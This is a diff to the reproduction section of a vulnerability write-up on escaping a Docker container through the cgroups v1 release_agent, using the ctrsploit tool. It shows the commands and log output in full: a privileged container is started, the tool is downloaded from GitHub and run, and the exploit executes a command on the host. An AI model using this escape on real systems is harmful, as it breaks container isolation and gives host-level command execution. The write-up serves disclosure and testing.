@@ -40,6 +40,8 @@ vulnerability exploitable:
 
 ## 5. Reproduce
 
+![](./video.svg)
+
 ### 5.1 Reproduce Environment
 
 ```
@@ -110,15 +112,19 @@ WARNING: No swap limit support
 
 ```shell
 root@localhost:~# docker run -ti --name poc --cap-add CAP_SYS_ADMIN --security-opt apparmor=unconfined busybox
-/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
-/ # ctrsploit --colorful checksec release_agent
-✔  release_agent	# Container can be escaped when has cap_sys_admin and use cgroups v1
-
-/ # ctrsploit exploit ra -c 'docker ps '
-INFO[0001] 
-===========start of result==============
+/ # ctrsploit vul caps sys_admin c
+[Y]  cap_sys_admin	# Container can be escaped when has cap_sys_admin
+/ # ctrsploit vul caps sys_admin x release_agent -c 'docker ps '
+INFO[0000] overwrite payload to /etc/hosts              
+INFO[0000] mount cgroup to /tmp/cgrp248282294           
+INFO[0000] invoke notify_on_release: echo 1 > /tmp/cgrp248282294/x/notify_on_release 
+INFO[0000] create release_agent: /tmp/cgrp248282294/release_agent 
+INFO[0000] umount /tmp/cgrp248282294                    
+INFO[0000] rm -rf /tmp/cgrp248282294                    
+INFO[0000] recover /etc/hosts                           
+INFO[0000] result:
 CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
-4a2fe985bd56        busybox             "sh"                33 seconds ago      Up 31 seconds                           poc
-===========end of result==============
+836c92e4f52f        busybox             "sh"                19 seconds ago      Up 18 seconds                           poc
 ```
